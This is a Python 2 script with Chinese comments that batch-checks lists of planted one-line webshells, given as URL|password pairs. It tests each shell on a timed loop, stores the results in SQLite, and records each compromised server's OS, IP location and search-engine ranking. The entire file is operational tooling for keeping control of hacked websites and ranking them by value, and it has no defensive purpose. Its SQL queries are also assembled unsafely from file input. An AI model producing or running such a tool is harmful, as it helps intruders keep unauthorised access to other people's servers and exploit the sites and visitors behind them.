#!/usr/local/bin/python
#-*- coding: UTF-8 -*-

import yijuhua
import thread
import Csqlite3  #数据库操作
import qqwry  #网址返回  IP和物理地址
import br_pr_sogo #获取网站权重  br
import g  #公用文件
import time
#共0条--OK0条--NO0条--等待测试0条
yu_1=0  #共多少数据
yu_2=0  #成功多少条
yu_3=0  #失败多少条
import urllib #转换成网络格式
import sys
reload(sys)
sys.setdefaultencoding('utf-8')

class   now1():
    def __init__(self):

        self.sql3=Csqlite3.C_sqlite3()
        self.sql3.mysqlite3_open()
        self.h=qqwry.C_hoset()

    def br_pr_sogo(self,s0,s1):  #获取 百度 谷歌  搜狗  权重
        try:
            #s0=br_pr_sogo.get_domain(str(s0),0)
            baidu_br=br_pr_sogo.baidu_br(br_pr_sogo.get_domain(str(s0),0))
            if int(baidu_br)<=0:
                #print "0000000000000000000000000"
                baidu_br=br_pr_sogo.aizhan_br(br_pr_sogo.get_domain(str(s0),0))
            google_pr=br_pr_sogo.google_pr(s0)
            sogo=br_pr_sogo.sogo(br_pr_sogo.get_domain(str(s0),0))
            sql_data="update shell set br='%s',pr='%s',sogo='%s' where urls1='%s' and passwods2='%s'"%(baidu_br,google_pr,sogo,str(s0),str(s1))
            #print sql_data
            self.sql3.mysqlite3_update(sql_data)
            print u"URL:%s--br:%s pr:%s sougo:%s"%(br_pr_sogo.get_domain(str(s0),1),baidu_br,google_pr,sogo)
        except BaseException, e:
            print(str(e))
            return 0

    def messagebox(self):
        g_int=(yu_2+yu_3)
        print u"一句话总数%s条---成功%d条---失败%d条---成功率%.3f%%"%(g_int,yu_2,yu_3,(float(yu_2)/float(g_int)*100))


    def db_cs(self,ID):  #测试还没有测试过的一句话
        try:
            global yu_1,yu_2,yu_3
            sql_data =""
            if ID==0:
                sql_data = "select * from shell where zts3 is null"
            if ID==1:
                sql_data = "select * from shell where zts3='ok'"
            if ID==2:
                sql_data = "select * from shell where zts3='No'"
            self.sql3.conn.commit()# 获取到游标对象
            cur = self.sql3.conn.cursor()# 用游标来查询就可以获取到结果
            cur.execute(sql_data)# 获取所有结果
            res = cur.fetchall()  #从结果中取出所有记录
            for line in res:
                s0=str(line[0])
                s1=str(line[1])
                data_time2=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                data_time=time.mktime(time.strptime(data_time2,'%Y-%m-%d %H:%M:%S'))  #转化成时间戳
                if s0=="" or len(s0)<=7:
                    yu_3+=1  #失败多少条
                    sql_data="update shell set zts3='null',time2s7='%s' where urls1='%s' and passwods2='%s'"%(data_time,str(s0),str(s1))
                    self.sql3.mysqlite3_update(sql_data)
                    continue  #跳过
                if yijuhua.yijuhua_cs(g.bool_asp_php(s0),str(s0),str(s1)):
                    yu_2+=1  #成功多少条
                    win_linux=yijuhua.yijuhua_win_linux(str(s0),str(s1))  #URL地址 ，密码   返回操作系统
                    WLWZ=self.h.www_data(qqwry.url_www(str(s0)))
                    WLWZ=u"%s"%(WLWZ)
                    if g.bool_asp_php(str(s0))=="asp":
                        win_linux="WinNT"
                    sql_data="update shell set zts3='ok',oss4='%s',ips5='%s',time2s7='%s' where urls1='%s' and passwods2='%s'"%(str(win_linux),WLWZ,data_time,str(s0),str(s1))
                    self.br_pr_sogo(s0,s1)  #获取 百度 谷歌  搜狗  权重
                    print u"URL:%s--passwod:%s-----ok-----%s"%(str(s0),str(s1),WLWZ)
                    self.messagebox()
                else:
                    yu_3+=1  #失败多少条
                    sql_data="update shell set zts3='No',oss4='No',time2s7='%s' where urls1='%s' and passwods2='%s'"%(data_time,str(s0),str(s1))
                    self.messagebox()
                    print u"URL:%s--passwod:%s-----No"%(str(s0),str(s1))
                self.sql3.mysqlite3_update(sql_data)
        except BaseException, e:
            print(str(e))
            return 0

    def open_file(self,data): #格式化
        ss = data.split("|")
        #if len(ss)<=3:
        return ss[0],ss[1]
        #return 0

    def oen_add_db(self,name):  #把数据添加到数据库
        xxx = file(name, 'r')
        i=0
        for xxx_line in xxx.readlines():
            try:
                data=xxx_line.strip().lstrip().rstrip('\n')
                s0,s1=self.open_file(data)
                if len(s0)>7:
                    data_time2=time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
                    data_time=time.mktime(time.strptime(data_time2,'%Y-%m-%d %H:%M:%S'))  #转化成时间戳
                    sql_data="insert into shell(urls1,passwods2,time1s6) VALUES('%s','%s','%s')"%(urllib.quote(str(s0.rstrip('\n'))),str(s1.strip().lstrip().rstrip('\n')),data_time)
                    self.sql3.mysqlite3_insert(sql_data)
                    i+=1
            except BaseException, e:
                print(str(e))
        print u"一共导入%d条一句话"%(i)

    def time_sleep(self):
        try:
            for i in range(500):
                print "sleep:500s---",i,"s"
                time.sleep(1)
        except BaseException, e:
            print(str(e))
            return 0

if __name__ == "__main__":
#1先测试空的还没有测试的
#2测试链接失败的
#3测试链接成功的
#停120s  循环测试
    xxss=now1()
    print u"=========  一句话批量自动检测 辅助工具 ========="
    try:
        if len(sys.argv) < 2:
            print u"无参数传入   \r\n软件使用bat方法   main.exe 1.txt   "
            print u"无参数传入   \r\n软件使用批处理或者cmd带参数传入   软件名 要扫描的内容    "
            print u"扫描内容一行一条        一句话地址|密码\r\n 格式如下   http://xxxx.com/Style.php|cmd"
            time.sleep(5)
        TXT_file=sys.argv[1]
        if not TXT_file=="":
            xxss.oen_add_db(TXT_file)  #把数据添加到数据库
    except BaseException, e:
        print(str(e))

    while True:
        try:
            for i in range(4):
                xxss.db_cs(i)
                if i==3:
                    yu_2=0  #成功多少条
                    yu_3=0  #失败多少条
                    xxss.time_sleep()
        except BaseException, e:
            print(str(e))
